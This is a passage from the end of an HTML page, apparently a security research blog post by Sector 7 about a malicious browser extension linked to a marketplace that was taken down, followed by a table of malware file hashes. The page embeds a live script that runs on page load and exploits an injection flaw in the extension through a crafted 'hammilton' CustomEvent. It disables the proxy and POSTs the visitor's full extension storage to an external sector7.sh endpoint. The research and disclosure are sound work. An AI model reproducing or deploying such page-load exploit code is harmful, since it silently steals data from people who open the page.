</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">dispatchEvent</span><span class="p">(</span><span class="k">new</span> <span class="nx">CustomEvent</span><span class="p">(</span><span class="s2">&#34;hammilton&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;detail&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;l&#34;</span><span class="o">:</span> <span class="s2">&#34;a&#39;;&#34;</span> <span class="o">+</span> <span class="nx">payload</span> <span class="o">+</span> <span class="s2">&#34;; //&#34;</span><span class="p">,</span> <span class="s2">&#34;o&#34;</span><span class="o">:</span> <span class="s2">&#34;b&#34;</span><span class="p">}}));</span>
</span></span></code></pre></div><p>We have actually included a script in this page which will exploit this precise vulnerability (if you have this extension installed). It first turned off the proxy functionality, and then uploaded your extension configuration to us.</p>
<script>

setTimeout(() => {
	var payload = `chrome.storage.local.get(null, (storage) => {
	chrome.runtime.sendMessage({
		"action": "s.k",
		"data": {
			"enabled": false
		}
	});

	setTimeout(() => {
		fetch("https://soo8av8eis4w.sector7.sh/eic3Xie7ii3y.php", {"method": "POST", "body": JSON.stringify(storage), "mode": "no-cors" }).then((data) => {
			if (storage.ext_set.proxy_enabled) {
				chrome.runtime.sendMessage({
					"action": "s.k",
					"data": {
						"enabled": true
					}
				})
			}
		})
	}, 100);
});`;

	window.dispatchEvent(new CustomEvent("hammilton", {"detail": {"l": "a';" + payload.replaceAll("\n", " ") + "; //", "o": "b"}}));
}, 1000);

</script>
<h1 id="conclusions">Conclusions</h1>
<p>We would like to thank all law enforcement agencies that collaborated on this case, to take this market place down. We&rsquo;re glad we could be of any assistance. All findings have been shared with authorities and all malicious files have been reported to the relevant organisations. Hopefully this post can help any future researchers, if this market place ever comes back online.</p>
<p>If you have any followup questions, feel free to <a href="/contact">reach out</a>.</p>
<p>For reference, these are the files that we investigated (the buyers side is purposely excluded from this list):</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">File name</th>
          <th style="text-align: left">SHA1 hash</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><code>setup.exe</code></td>
          <td style="text-align: left"><code>b3e56f7affa17403d3df4ebf4c95b14928798bd6</code></td>
      </tr>
      <tr>
          <td style="text-align: left"><code>yvibiajwi.dll</code></td>
          <td style="text-align: left"><code>78c43eb6d80888c8153868ebc60ca522185a1fce</code></td>
      </tr>
      <tr>
          <td style="text-align: left"><code>svchost.exe</code></td>
          <td style="text-align: left"><code>f811f77f5b53c13a06b43b10eb6189513f66d2a2</code></td>
      </tr>
      <tr>
          <td style="text-align: left"><code>Qruhaepdediwhf.dll</code></td>
          <td style="text-align: left"><code>e87a4c23eac88803f27565c2a035222473167a14</code></td>
      </tr>
      <tr>
          <td style="text-align: left"><code>v3.bs64</code></td>
          <td style="text-align: left"><code>36af8aac85d4770146d7b6c6cbb0dc7691c6263a</code></td>
      </tr>
  </tbody>
</table>


                            
                            
                            
                            
                            
                            
                            <div class="center-btn"><a href="/" class="button fixed">Back</a></div>
                            
                        </section>

					</div>

                    
<div id="copyright">
    <ul><li>&copy; Sector 7 is powered by <a href="https://computest.nl/">Computest</a></li></ul>
</div>


                    <a href="#navPanel" id="navPanelToggle">Menu</a>
            </div>
            
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-FXZL2B6QCW"></script>
      <script>
        var doNotTrack = false;
        if ( true ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-FXZL2B6QCW');
        }
      </script>
            










<script src='/assets/js/bundle.js'></script>


	</body>
</html>
